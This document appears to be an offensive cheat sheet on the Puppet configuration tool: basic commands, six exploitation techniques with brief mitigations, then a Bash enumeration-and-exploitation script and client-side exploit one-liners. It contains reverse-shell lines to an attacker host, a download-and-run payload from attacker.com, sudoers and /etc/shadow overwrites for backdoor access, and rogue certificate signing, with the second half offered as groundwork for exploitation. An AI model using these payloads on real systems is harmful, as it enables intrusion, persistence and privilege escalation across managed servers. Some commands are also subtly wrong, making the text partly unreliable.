### Puppet Cheat Sheet with Exploitation Techniques

#### **Puppet Overview**

Puppet is an open-source configuration management tool used to automate the provisioning, configuration, and management of servers. It uses a declarative language to define the desired state of system resources, and Puppet enforces this state across infrastructure.

#### **Basic Puppet Commands**

- `puppet apply <manifest.pp>`: Apply a manifest locally on a node.
- `puppet agent -t`: Run the Puppet agent manually (trigger a Puppet run).
- `puppet resource <type> <name>`: Inspect and manipulate resources.
-  `puppet module install <module-name>`: Install a Puppet module.
- `puppet cert list`: List certificates on the Puppet master.
- `puppet cert sign <certname>`: Sign a certificate request on the Puppet master.

#### **Puppet Manifests**

- **Defining a resource:**
  ```puppet
  file { '/tmp/testfile':
    ensure  => 'present',
    content => 'This is a test file',
  }
  ```

- **Defining a class:**
  ```puppet
  class example_class {
    file { '/tmp/classfile':
      ensure  => 'present',
      content => 'This is a class file',
    }
  }
  ```

- **Including a class in a node:**
  ```puppet
  node 'example_node' {
    include example_class
  }
  ```

#### **Puppet Exploitation Techniques**

##### 1. **Malicious Manifest Injection**
   - **Scenario**: An attacker with access to the Puppet server can modify manifests to include malicious commands that will be executed on client nodes.
   - **Example**: Inject a reverse shell:
     ```puppet
     exec { 'reverse_shell':
       command => '/bin/bash -c "bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1"',
     }
     ```
   - **Mitigation**: Implement strict access control to Puppet manifests and repositories.

##### 2. **Abusing `puppet apply` with Malicious Modules**
   - **Scenario**: An attacker can create or modify a Puppet module that performs unintended actions.
   - **Example**: Modify a file to include a backdoor:
     ```puppet
     file { '/etc/sudoers':
       ensure  => 'present',
       content => "root ALL=(ALL:ALL) ALL\nattacker ALL=(ALL:ALL) NOPASSWD: ALL\n",
     }
     ```
   - **Mitigation**: Use code reviews, digital signatures, and audit trails for all Puppet modules.

##### 3. **Compromising the Puppet Master**
   - **Scenario**: If the Puppet master server is compromised, an attacker can control all nodes by signing new certificates or distributing malicious code.
   - **Example**: Sign a rogue certificate:
     ```bash
     puppet cert sign rogue_node
     ```
   - **Mitigation**: Secure the Puppet master, use multi-factor authentication, and monitor for unusual certificate requests.

##### 4. **Certificate Forgery**
   - **Scenario**: An attacker with access to the Puppet master can create or forge certificates to impersonate legitimate nodes.
   - **Example**:
     ```bash
     openssl genrsa -out rogue_key.pem 2048
     openssl req -new -key rogue_key.pem -out rogue_csr.pem
     puppet cert sign rogue_csr.pem
     ```
   - **Mitigation**: Enforce strict certificate management policies and monitor for abnormal certificates.

##### 5. **Exploiting Puppet Modules for Code Execution**
   - **Scenario**: Many Puppet modules include external resources or execute commands. These can be exploited if not securely configured.
   - **Example**:
     ```puppet
     package { 'wget':
       ensure => 'installed',
     }
     
     exec { 'download_payload':
       command => 'wget http://attacker.com/payload.sh -O /tmp/payload.sh && bash /tmp/payload.sh',
     }
     ```
   - **Mitigation**: Audit and review all external commands or packages invoked by Puppet.

##### 6. **Privilege Escalation via Puppet**
   - **Scenario**: Puppet runs with elevated privileges, and poorly written manifests can lead to privilege escalation.
   - **Example**: Modify critical system files:
     ```puppet
     file { '/etc/shadow':
       ensure  => 'present',
       content => 'root:$6$randomhash:18008::::::\n',
     }
     ```
   - **Mitigation**: Use least privilege practices and separate manifest execution environments.

### **Conclusion**

Puppet is a powerful tool, but its misuse or compromise can lead to significant security risks. By understanding the basic operations and potential exploitation techniques, administrators can better secure their Puppet infrastructure and prevent attacks.

This cheat sheet offers both practical Puppet commands and an overview of potential security risks, emphasizing the need for vigilant security practices in configuration management.

Here’s a Bash script that checks if Puppet is installed on a Linux server, identifies potential exploit paths, and outlines possible commands for client-side exploitation.

### Puppet Enumeration and Exploitation Script

```bash
#!/bin/bash

echo "Starting Puppet enumeration..."

# Function to check if Puppet is installed
check_puppet_installed() {
    if command -v puppet &> /dev/null; then
        echo "Puppet is installed."
    else
        echo "Puppet is not installed."
        exit 1
    fi
}

# Function to identify Puppet installation paths and files
identify_puppet_files() {
    echo "Identifying Puppet installation files..."

    # Common Puppet paths
    puppet_paths=(
        "/etc/puppet"
        "/var/lib/puppet"
        "/opt/puppetlabs"
        "/etc/puppetlabs"
    )

    for path in "${puppet_paths[@]}"; do
        if [ -d "$path" ]; then
            echo "Found Puppet directory: $path"
            find "$path" -type f
        fi
    done
}

# Function to check for potential exploit paths
check_exploit_paths() {
    echo "Checking for potential Puppet exploit paths..."

    # Check if there are any manifest or module files
    find /etc/puppet* /opt/puppetlabs -type f -name "*.pp" -o -name "*.rb" -o -name "*.erb" 2>/dev/null | while read -r file; do
        echo "Found possible Puppet manifest/module: $file"
        grep -Ei "(exec|command|system|user|file|package)" "$file"
    done

    # Check for readable keys or certificates
    find /etc/puppet* /opt/puppetlabs -type f -name "*.pem" -o -name "*.key" 2>/dev/null | while read -r keyfile; do
        echo "Found key file: $keyfile"
        if [ -r "$keyfile" ]; then
            echo "Key file is readable: $keyfile"
        fi
    done
}

# Function for client-side exploitation
client_side_exploitation() {
    echo "Possible client-side exploits if running Puppet agent..."

    # Check if puppet agent is running
    if pgrep puppet > /dev/null; then
        echo "Puppet agent is running."

        # Commands to exploit Puppet agent from client-side
        echo "To exploit the agent and execute commands remotely:"
        echo "puppet apply -e 'exec { \"exploit\": command => \"/bin/bash -c \\\"bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1\\\"\", }'"
        echo "puppet agent -t # Trigger a Puppet run"
    else
        echo "Puppet agent is not running."
    fi
}

# Start the enumeration
check_puppet_installed
identify_puppet_files
check_exploit_paths
client_side_exploitation

echo "Puppet enumeration completed."
```

### **Explanation of the Script**

1. **Puppet Installation Check:**
   - The script checks if Puppet is installed on the system using the `command -v puppet` command. If Puppet is not found, the script exits.

2. **Identify Puppet Installation Paths and Files:**
   - The script searches for common Puppet directories such as `/etc/puppet`, `/var/lib/puppet`, `/opt/puppetlabs`, and `/etc/puppetlabs`.
   - It lists files within these directories, which may include manifests, modules, and configuration files.

3. **Check for Exploit Paths:**
   - The script searches for Puppet manifest (`*.pp`), Ruby (`*.rb`), and ERB (`*.erb`) files and looks for potentially exploitable commands (e.g., `exec`, `system`, `file`, `package`).
   - It also checks for readable key files (`*.pem`, `*.key`), which could be leveraged in an attack.

4. **Client-Side Exploitation:**
   - If the Puppet agent is running, the script provides an example command to exploit the agent and execute arbitrary commands on the server.

### **How to Use the Script**

1. **Copy and Save the Script**: Save the script as `puppet_enum.sh` and make it executable with `chmod +x puppet_enum.sh`.
2. **Run the Script**: Execute the script with `sudo ./puppet_enum.sh` to perform the enumeration and check for potential exploitation paths.
3. **Review the Output**: The script will output details about Puppet’s presence, configuration files, potential exploit paths, and possible client-side exploitation commands.

### **Client-Side Exploits to Move to the Server**

If Puppet is used in an environment where the server controls configurations on client machines, exploiting the Puppet agent can allow an attacker to execute commands on the server via crafted manifests.

#### **Example Client-Side Exploits**

1. **Execute Arbitrary Commands:**
   ```bash
   puppet apply -e 'exec { "exploit": command => "/bin/bash -c \\"bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1\\"", }'
   ```

2. **Abuse Puppet Resources:**
   ```bash
   puppet apply -e 'file { "/tmp/backdoor": ensure => "present", content => "reverse_shell_payload_here", }'
   puppet apply -e 'package { "netcat": ensure => "installed", }'
   ```

### **Conclusion**

This script helps identify Puppet installations and their potential vulnerabilities, providing the groundwork for further investigation and exploitation, particularly in environments where Puppet is used for automated configuration management.